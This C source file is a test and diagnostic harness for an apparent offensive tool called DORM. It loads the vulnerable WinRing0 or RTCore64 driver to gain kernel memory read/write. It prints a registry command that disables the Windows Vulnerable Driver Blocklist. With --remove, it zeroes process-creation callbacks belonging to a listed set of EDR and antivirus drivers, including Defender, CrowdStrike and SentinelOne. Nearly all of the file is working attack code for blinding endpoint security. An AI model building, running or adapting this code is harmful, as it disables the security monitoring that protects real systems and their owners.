/*
 * test_byovd.c — DORM Phase 14: BYOVD Verification + Diagnostic
 * byovd/kernel_subverter/test_byovd.c
 *
 * Windows x64 | MinGW/Clang
 * Must run from an elevated (Administrator) PowerShell.
 *
 * Build against WinRing0 backend (current):
 *   clang byovd/kernel_subverter/byovd_winring0x64.c  \
 *         byovd/kernel_subverter/test_byovd.c         \
 *         -Ibyovd/kernel_subverter                    \
 *         -o test_byovd.exe -lkernel32 -ladvapi32
 *
 * Build against RTCore64 backend (legacy):
 *   clang byovd/kernel_subverter/byovd.c              \
 *         byovd/kernel_subverter/test_byovd.c         \
 *         -Ibyovd/kernel_subverter                    \
 *         -o test_byovd.exe -lkernel32 -ladvapi32
 *
 * Usage:
 *   .\test_byovd.exe .\WinRing0x64.sys             enumerate callbacks
 *   .\test_byovd.exe .\WinRing0x64.sys --remove    zero EDR callbacks
 *   .\test_byovd.exe .\WinRing0x64.sys --diag      full IOCTL diagnostic
 *
 * Step sequence:
 *   14.0  file check
 *   14.1  byovd_load()                  — SCM service + StartService
 *   14.2  byovd_open()                  — device handle
 *   14.2b byovd_find_ntoskrnl_phys()    — VA→PA physical scan  [WinRing0 only]
 *   14.3  byovd_read8(kernel_base)      — MZ sanity check
 *   14.4  dorm_enum / remove callbacks  — PspCreateProcessNotifyRoutine
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "byovd.h"

/*
 * FIX 3: Diagnostic struct and device path are now WinRing0-specific.
 *
 * Old (broken): DIAG_MEM_OP was the 32-byte RTCore64 layout, and the
 * diagnostic opened \\.\RTCore64. When linked against byovd_winring0x64.c
 * this opened the wrong device and sent the wrong struct, producing
 * meaningless error codes that obscured the real IOCTL problem.
 *
 * Fixed: diagnostic uses OLS_READ_INPUT (16 bytes) and \\.\WinRing0_1_2_0.
 * A compile-time define (BYOVD_BACKEND_RTCORE64) switches back to the
 * RTCore64 layout for legacy builds.
 */
#ifndef BYOVD_BACKEND_RTCORE64

  /* ── WinRing0 diagnostic structs ── */
  #pragma pack(push, 1)
  typedef struct {
      DWORD64 Address;    /* physical address    */
      DWORD   UnitSize;
      DWORD   Count;
  } DIAG_READ_INPUT;      /* 16 bytes            */
  #pragma pack(pop)
  _Static_assert(sizeof(DIAG_READ_INPUT) == 16, "DIAG_READ_INPUT must be 16 bytes");

  #define DIAG_DEVICE       "\\\\.\\WinRing0_1_2_0"
  #define DIAG_IOCTL_READ   0x9C402104UL   /* IOCTL_OLS_READ_MEMORY  */
  #define DIAG_BACKEND_NAME "WinRing0x64"

#else

  /* ── RTCore64 diagnostic structs (legacy, -DBYOVD_BACKEND_RTCORE64) ── */
  #pragma pack(push, 1)
  typedef struct {
      BYTE    Padding[8];
      ULONG64 Address;
      ULONG   Pad2;
      ULONG   Size;
      ULONG   Value;
      ULONG   Pad3;
  } DIAG_READ_INPUT;      /* 32 bytes            */
  #pragma pack(pop)
  _Static_assert(sizeof(DIAG_READ_INPUT) == 0x20, "DIAG_READ_INPUT must be 32 bytes");

  #define DIAG_DEVICE       "\\\\.\\RTCore64"
  #define DIAG_IOCTL_READ   0x80002048UL
  #define DIAG_BACKEND_NAME "RTCore64"

#endif  /* BYOVD_BACKEND_RTCORE64 */

/* ============================================================
   PRIVILEGE + SYSTEM CHECKS
   ============================================================ */

static BOOL is_elevated(void)
{
    BOOL e = FALSE; HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &ht)) return FALSE;
    TOKEN_ELEVATION te; DWORD sz = sizeof(te);
    if (GetTokenInformation(ht, TokenElevation, &te, sizeof(te), &sz))
        e = (te.TokenIsElevated != 0);
    CloseHandle(ht); return e;
}

static BOOL enable_load_driver_privilege(void)
{
    HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ht))
        return FALSE;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeLoadDriverPrivilege", &luid);
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    AdjustTokenPrivileges(ht, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError(); CloseHandle(ht);
    return err != ERROR_NOT_ALL_ASSIGNED;
}

static void check_blocklist(void)
{
    printf("\n[blocklist] Checking Windows Vulnerable Driver Blocklist...\n");

    HKEY hk = NULL;
    BOOL opened = (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                   "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
                   0, KEY_READ, &hk) == ERROR_SUCCESS);

    if (!opened) {
        printf("[blocklist] CI\\Config key not found — blocklist likely inactive\n");
        return;
    }

    DWORD val = 0, sz = sizeof(val), type = 0;
    LONG  r   = RegQueryValueExA(hk, "VulnerableDriverBlocklistEnable",
                                 NULL, &type, (BYTE *)&val, &sz);
    RegCloseKey(hk);

    if (r == ERROR_SUCCESS && type == REG_DWORD) {
        if (val == 1) {
            printf("[blocklist] VulnerableDriverBlocklistEnable = 1  ← ENABLED\n");
            printf("[blocklist] IOCTLs are intercepted by CI before reaching dispatch.\n");
            printf("[blocklist] WinRing0x64.sys is NOT on this list — if you see this\n");
            printf("[blocklist] with WinRing0, something else is blocking (e.g. HVCI).\n");
            printf("\n[blocklist] To disable (requires reboot):\n");
            printf("[blocklist]   reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config\"\n");
            printf("[blocklist]        /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f\n");
            printf("[blocklist]   Restart-Computer\n\n");
        } else {
            printf("[blocklist] VulnerableDriverBlocklistEnable = %lu  ← disabled\n", val);
        }
    } else {
        printf("[blocklist] VulnerableDriverBlocklistEnable not set — disabled\n");
    }
}

static BOOL check_hvci(void)
{
    HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\"
                      "Scenarios\\HypervisorEnforcedCodeIntegrity",
                      0, KEY_READ, &hk) != ERROR_SUCCESS)
        return FALSE;
    DWORD val = 0, sz = sizeof(val), type = 0;
    RegQueryValueExA(hk, "Enabled", NULL, &type, (BYTE *)&val, &sz);
    RegCloseKey(hk);
    return (type == REG_DWORD && val == 1);
}

/* ============================================================
   IOCTL DIAGNOSTIC
   ============================================================ */

static void byovd_diagnose(ULONG64 kernel_base)
{
    printf("\n[DIAG] ════════════════════════════════════════════════════\n");
    printf("[DIAG] IOCTL Diagnostic — backend: %s\n", DIAG_BACKEND_NAME);
    printf("[DIAG] sizeof(DIAG_READ_INPUT) = %zu bytes\n", sizeof(DIAG_READ_INPUT));
    printf("[DIAG] device: %s\n", DIAG_DEVICE);
    printf("[DIAG] IOCTL:  0x%08lX\n", DIAG_IOCTL_READ);
    printf("[DIAG] ════════════════════════════════════════════════════\n\n");

    /*
     * Open a dedicated diagnostic handle so the diagnostic is
     * independent of the main byovd_open() handle state.
     */
    HANDLE hDiag = CreateFileA(DIAG_DEVICE,
                               GENERIC_READ | GENERIC_WRITE,
                               0, NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDiag == INVALID_HANDLE_VALUE) {
        printf("[DIAG] Cannot open %s for diagnostic: error=%lu\n",
               DIAG_DEVICE, GetLastError());
        printf("[DIAG] Driver may not be loaded — run step 14.1 first.\n");
        return;
    }

    /*
     * Test addresses:
     *   kernel_base            — ntoskrnl .text, always mapped, readable
     *   kernel_base + 0x1000   — second page, also reliably mapped
     *   KUSER_SHARED_DATA      — 0xFFFFF78000000000, always present read-only
     *
     * For WinRing0 these must be PHYSICAL addresses after VA→PA.
     * Since byovd_find_ntoskrnl_phys may not have run yet at diagnostic
     * time, we test with KUSER_SHARED_DATA which is identity-mapped on
     * most systems (PA ≈ 0x7FFE0000). We flag this clearly.
     *
     * The main purpose of the diagnostic: confirm the IOCTL reaches the
     * driver dispatch and that the input struct layout is correct.
     * A single success at any address confirms the IOCTL plumbing works.
     */
    struct {
        ULONG64     addr;
        const char *label;
        BOOL        is_physical;
    } addrs[] = {
        { 0x7FFE0000ULL,         "KUSER_SHARED_DATA (PA=0x7FFE0000 on most systems)", TRUE  },
        { 0x1000000ULL,          "phys 0x1000000 (likely ntoskrnl region)",           TRUE  },
        { kernel_base,           "ntoskrnl VA base (NOT physical — expect failure)",  FALSE },
    };

    BOOL any_success = FALSE;

    for (int a = 0; a < 3; a++) {
        printf("[DIAG] addr: 0x%016llX  (%s)\n",
               (unsigned long long)addrs[a].addr,
               addrs[a].label);

        DIAG_READ_INPUT in_buf;
        ZeroMemory(&in_buf, sizeof(in_buf));

#ifndef BYOVD_BACKEND_RTCORE64
        /* WinRing0: Address, UnitSize=4, Count=1 */
        in_buf.Address  = addrs[a].addr;
        in_buf.UnitSize = 4;
        in_buf.Count    = 1;
#else
        /* RTCore64: Padding, Address, Size */
        in_buf.Address = addrs[a].addr;
        in_buf.Size    = 4;
#endif

        /* dump raw input buffer */
        BYTE *raw = (BYTE *)&in_buf;
        printf("  in_buf[%zu]: ", sizeof(in_buf));
        for (size_t i = 0; i < sizeof(in_buf); i++)
            printf("%02X", raw[i]);
        printf("\n");

        DWORD out_val  = 0;
        DWORD returned = 0;
        BOOL  ok       = DeviceIoControl(hDiag, DIAG_IOCTL_READ,
                                          &in_buf,  sizeof(in_buf),
                                          &out_val, sizeof(out_val),
                                          &returned, NULL);
        if (ok) {
            printf("  → OK  returned=%lu  value=0x%08lX\n", returned, out_val);
            any_success = TRUE;
        } else {
            DWORD err = GetLastError();
            printf("  → FAIL error=%lu", err);
            switch (err) {
                case 31:  printf(" (ERROR_GEN_FAILURE — wrong IOCTL? PA issue?)"); break;
                case 87:  printf(" (ERROR_INVALID_PARAMETER — struct layout wrong?)"); break;
                case  5:  printf(" (ERROR_ACCESS_DENIED — blocklist / permissions)"); break;
                case  1:  printf(" (ERROR_INVALID_FUNCTION — IOCTL code wrong)");  break;
                case  6:  printf(" (ERROR_INVALID_HANDLE)");                        break;
                case 50:  printf(" (ERROR_NOT_SUPPORTED)");                         break;
                default:  break;
            }
            printf("\n");
        }
        printf("\n");
    }

    CloseHandle(hDiag);

    printf("[DIAG] ════════════════════════════════════════════════════\n");
    if (any_success) {
        printf("[DIAG] At least one physical read succeeded.\n");
        printf("[DIAG] IOCTL plumbing is correct — VA→PA translation needed for ntoskrnl VAs.\n");
        printf("[DIAG] If step 14.2b (phys scan) succeeded, byovd_read8 should work.\n");
    } else {
        printf("[DIAG] ALL reads failed.\n");
        printf("[DIAG] error=31 (GEN_FAILURE): physical address bad, or\n");
        printf("[DIAG]   PA scan range needs extending beyond 4 GB.\n");
        printf("[DIAG] error=87 (INVALID_PARAMETER): struct size or IOCTL code wrong.\n");
        printf("[DIAG] error=5  (ACCESS_DENIED): HVCI or CI blocklist active.\n");
    }
    printf("[DIAG] ════════════════════════════════════════════════════\n\n");
}

/* ============================================================
   MAIN
   ============================================================ */

int main(int argc, char **argv)
{
    const char *driver_path = ".\\WinRing0x64.sys";  /* FIX 3: default to WinRing0 */
    BOOL        do_remove   = FALSE;
    BOOL        do_diag     = FALSE;

    for (int i = 1; i < argc; i++) {
        if      (strcmp(argv[i], "--remove") == 0) do_remove = TRUE;
        else if (strcmp(argv[i], "--diag")   == 0) do_diag   = TRUE;
        else driver_path = argv[i];
    }

    printf("DORM Phase 14 — BYOVD Kernel Subversion\n");
    printf("backend: %s\n", DIAG_BACKEND_NAME);
    printf("=========================================\n\n");

    if (!is_elevated()) {
        printf("[!] NOT elevated — run from Administrator PowerShell:\n");
        printf("[!]   Win+X -> Windows Terminal (Admin)\n");
        printf("[!]   cd D:\\Dinku\\projects\\DORM\n");
        printf("[!]   .\\test_byovd.exe .\\WinRing0x64.sys\n");
        printf("\nPress Enter to exit...\n"); getchar();
        return 1;
    }
    printf("[priv] Running elevated: ok\n");

    if (check_hvci())
        printf("[hvci] HVCI ENABLED — kernel driver load may fail\n");
    else
        printf("[hvci] HVCI not detected: ok\n");

    check_blocklist();

    printf("[priv] Enabling SeLoadDriverPrivilege... ");
    fflush(stdout);
    if (!enable_load_driver_privilege()) {
        printf("FAILED\n");
        printf("Press Enter to exit...\n"); getchar();
        return 1;
    }
    printf("ok\n\n");

    /* ── 14.0 file check ────────────────────────────────────── */
    char abs_driver[MAX_PATH] = {0};
    GetFullPathNameA(driver_path, MAX_PATH, abs_driver, NULL);
    printf("[14.0] Driver: %s\n", abs_driver);

    if (GetFileAttributesA(abs_driver) == INVALID_FILE_ATTRIBUTES) {
        printf("[14.0] FAILED — file not found\n");
        printf("Press Enter to exit...\n"); getchar();
        return 1;
    }

    {
        HANDLE hf = CreateFileA(abs_driver, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            printf("[14.0] File size: %lu bytes\n", GetFileSize(hf, NULL));
            CloseHandle(hf);
        }
    }
    printf("[14.0] ok\n\n");

    /* ── 14.1 load driver ───────────────────────────────────── */
    printf("[14.1] Loading %s...\n", DIAG_BACKEND_NAME);
    fflush(stdout);
    if (!byovd_load(abs_driver)) {
        printf("[14.1] FAILED\n");
        printf("Press Enter to exit...\n"); getchar();
        return 1;
    }
    printf("[14.1] ok\n\n");

    /* ── 14.2 open device handle ────────────────────────────── */
    printf("[14.2] Opening device handle (%s)...\n", DIAG_DEVICE);
    fflush(stdout);
    if (!byovd_open()) {
        printf("[14.2] FAILED — error=%lu\n", GetLastError());
        goto cleanup;
    }
    printf("[14.2] ok\n\n");

    /* ── resolve kernel base (needed for phys scan + diag) ─── */
    ULONG64 kernel_base = byovd_get_kernel_base();
    if (!kernel_base) {
        printf("[14.2] kernel base resolution FAILED\n");
        goto cleanup;
    }
    printf("[14.2] ntoskrnl VA base: 0x%016llX\n\n",
           (unsigned long long)kernel_base);

    /* ── run diagnostic first if requested ─────────────────── */
    if (do_diag) byovd_diagnose(kernel_base);

#ifndef BYOVD_BACKEND_RTCORE64
    /* ── 14.2b VA→PA physical scan (WinRing0 backend only) ── */
    printf("[14.2b] Scanning physical memory for ntoskrnl...\n");
    printf("        (this takes 5-30 seconds — scanning 0x100000..0x100000000)\n");
    fflush(stdout);

    ULONG64 pa_base = byovd_find_ntoskrnl_phys(kernel_base);
    if (!pa_base) {
        printf("[14.2b] FAILED — physical scan found no matching PE\n");
        printf("[14.2b] Possible causes:\n");
        printf("[14.2b]   1. ntoskrnl PA is above 4 GB (PHYS_SCAN_END too low)\n");
        printf("[14.2b]   2. IOCTLs failing before phys_read4 returns data\n");
        printf("[14.2b]   3. IOCTL_OLS_READ_MEMORY still returning error\n");
        printf("[14.2b]   → run with --diag to see raw IOCTL results first\n");

        if (!do_diag) {
            printf("[14.2b] running diagnostic automatically...\n\n");
            byovd_diagnose(kernel_base);
        }
        goto cleanup;
    }
    printf("[14.2b] ok — ntoskrnl PA: 0x%016llX\n\n",
           (unsigned long long)pa_base);
#endif

    /* ── 14.3 verify R/W (read MZ header of ntoskrnl) ──────── */
    printf("[14.3] Verifying kernel R/W (reading ntoskrnl MZ header)...\n");
    fflush(stdout);

    ULONG64 mz = 0;
    if (!byovd_read8(kernel_base, &mz)) {
        printf("[14.3] kernel read FAILED\n");
        if (!do_diag) {
            printf("[14.3] running diagnostic automatically...\n\n");
            byovd_diagnose(kernel_base);
        }
        goto cleanup;
    }

    printf("[14.3] first 8 bytes @ VA 0x%016llX: 0x%016llX  %s\n",
           (unsigned long long)kernel_base,
           (unsigned long long)mz,
           ((mz & 0xFFFF) == 0x5A4D)
               ? "MZ valid ✓ — kernel R/W confirmed"
               : "unexpected value — check VA→PA translation");

    if ((mz & 0xFFFF) != 0x5A4D) goto cleanup;
    printf("[14.3] ok\n\n");

    /* ── 14.4 callback enumeration / removal ────────────────── */
    printf("[14.4] %s PspCreateProcessNotifyRoutine...\n",
           do_remove ? "Removing blacklisted entries from"
                     : "Enumerating");
    printf("        output → callbacks.json\n\n");
    fflush(stdout);

    int cb_count;
    if (do_remove) {
        const char *bl[] = {
            "MsSense.sys",
            "WdFilter.sys",
            "csagent.sys",
            "CsFirmwareAnalysis.sys",
            "SentinelMonitor.sys",
            "mbamswissarmy.sys",
            "klflt.sys",
            "eaw.sys",
        };
        cb_count = dorm_remove_process_callbacks(
                       bl, (int)(sizeof(bl) / sizeof(bl[0])),
                       "callbacks.json");
        printf("[14.4] %d callbacks found, blacklisted entries zeroed\n\n", cb_count);
    } else {
        cb_count = dorm_enum_process_callbacks("callbacks.json");
        printf("[14.4] %d process notify callbacks enumerated\n", cb_count);
        printf("        pass --remove to zero blacklisted EDR entries\n\n");
    }

cleanup:
    printf("[cleanup] Unloading %s...\n", DIAG_BACKEND_NAME);
    byovd_unload();
    printf("\nPhase 14 complete.\n");
    printf("  callbacks.json — PspCreateProcessNotifyRoutine dump\n");
    printf("\nPress Enter to close...\n");
    getchar();
    return 0;
}